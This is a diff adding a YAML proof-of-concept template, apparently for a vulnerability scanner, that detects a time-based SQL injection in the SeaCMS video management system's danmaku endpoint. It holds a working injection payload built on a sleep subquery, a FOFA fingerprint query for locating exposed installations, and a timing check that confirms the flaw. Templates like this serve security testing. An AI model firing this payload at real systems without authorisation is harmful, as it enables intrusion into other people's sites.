@@ -1,0 +1,20 @@
+id: poc-yaml-seacms-dmku-sqli
+info:
+  name: SeaCMS 海洋影视管理系统 index.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 海洋影视管理系统
+  fofa: app="海洋CMS"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /js/player/dmplayer/dmku/index.php?ac=edit
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: cid=(select(1)from(select(sleep({{.t1}})))x)&text=1&color=1
+  expression: "status_code == 200 && \ncontains(body,`\"code\":0,\"danmuku\":\"\\\
+    u5b8c\\u6210\"`) &&\nduration > t1 &&\nduration < t2\n"
+transport: http
